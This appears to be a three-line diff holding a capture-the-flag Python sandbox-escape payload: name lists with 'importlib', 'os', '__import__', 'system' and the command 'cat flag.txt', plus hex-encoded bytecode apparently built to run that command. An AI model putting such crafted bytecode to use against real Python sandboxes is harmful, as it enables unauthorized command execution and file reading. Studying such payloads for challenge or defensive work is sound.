@@ -1,0 +1,3 @@
+importlib,os,cat flag.txt
+__class__,_bootstrap,__import__,system
+66006d006d0064006600690083036d016d02640183016d03640283015300
